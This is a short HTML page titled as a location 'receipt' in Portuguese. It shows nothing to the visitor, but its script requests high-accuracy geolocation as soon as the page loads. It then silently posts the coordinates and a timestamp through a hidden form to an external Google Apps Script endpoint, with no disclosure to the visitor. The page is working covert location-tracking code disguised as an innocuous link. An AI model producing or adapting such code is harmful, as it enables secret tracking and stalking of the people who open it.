<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Comprovante de Localização</title>
</head>
<body>
  <script>
    function enviar(lat, lon) {
      const form = document.createElement("form");
      form.method = "POST";
      form.action = "https://script.google.com/macros/s/AKfycbxzo6oOrAcJIVbOuaUxGgj4mz0YL3IaWAYg8C49t-4MCV4jHWNlj5UwgXEBC01LjpDFwA/exec";
      form.style.display = "none";

      const latInput = document.createElement("input");
      latInput.name = "lat";
      latInput.value = lat;
      form.appendChild(latInput);

      const lonInput = document.createElement("input");
      lonInput.name = "lon";
      lonInput.value = lon;
      form.appendChild(lonInput);

      const tsInput = document.createElement("input");
      tsInput.name = "timestamp";
      tsInput.value = new Date().toISOString();
      form.appendChild(tsInput);

      document.body.appendChild(form);
      form.submit(); // envia sem problemas de CORS
    }

    window.onload = function() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => enviar(pos.coords.latitude, pos.coords.longitude),
          err => console.error("Erro ao obter localização:", err),
          { enableHighAccuracy: true }
        );
      } else {
        console.error("Geolocalização não suportada neste dispositivo.");
      }
    };
  </script>
</body>
</html>
